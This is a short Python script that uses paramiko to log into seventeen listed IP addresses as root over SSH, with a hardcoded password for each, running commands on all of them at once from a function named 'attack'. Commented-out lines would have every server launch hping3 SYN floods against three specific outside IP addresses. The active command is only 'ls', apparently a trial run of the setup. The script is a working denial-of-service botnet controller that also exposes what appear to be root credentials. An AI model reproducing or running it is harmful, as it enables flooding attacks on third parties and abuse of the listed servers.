import paramiko
import threading
 
server = ["107.173.15.121",
"107.174.115.14",
"173.82.26.34",
"107.174.93.71",
"96.45.160.142",
"23.94.91.169",
"107.174.176.169",
"216.127.187.70",
"173.82.26.33",
"23.94.0.90",
"192.210.228.203",
"23.94.200.34",
"107.174.181.138",
"198.52.100.198",
"107.174.115.139",
"107.174.172.18",
"198.148.122.145"]

pwd = ["2EL0oIgaq3Bo9BsE48",
"uvPq8UQ8zp4e79MUP9",
"0e4fU4wcI326XAQusK",
"rjU44BSM9Z0sYk9s7c",
"b54HSyYz2d8ANXu73x",
"d4uf54Q7tdJ0MxRM1I",
"yq81NAnFxC50VE9v3i",
"BQ1wkU7OiEj9Qz157z",
"AWgqKVhk2218n72uCN",
"Qrs487ndGZRrR4W5s7",
"Gb2W814VRNo3pduKk3",
"F77rm84GEiMA0e9lYw",
"Ie6Qe6sxs7PB4K93eS",
"80e62tHgVYfRkN5bC0",
"GS4NSr341IKbjt8fd2",
"94XYfTlo4f2Q3S3naJ",
"6UIzI7E60id40azRLw"]


def attack(a,b):
    cli = paramiko.SSHClient()
    cli.set_missing_host_key_policy(paramiko.AutoAddPolicy)
    cli.connect(hostname=a, port=22, username="root", password=b)
    #stdin, stdout, stderr = cli.exec_command("sudo hping3 -S -d 60000 125.184.237.199 -p 80 --flood")
    #stdin, stdout, stderr = cli.exec_command("sudo hping3 -S -d 60000 182.212.174.138 -p 80 --flood")
    #stdin, stdout, stderr = cli.exec_command("sudo hping3 -S -d 60000 220.120.137.188 -p 80 --flood")
    stdin, stdout, stderr = cli.exec_command("ls")
    lines = stdout.readlines()
    #print(''.join(lines))
    print(lines)
    

for n, i in enumerate(server):
    threading.Thread(target=attack, args=(i, pwd[n])).start()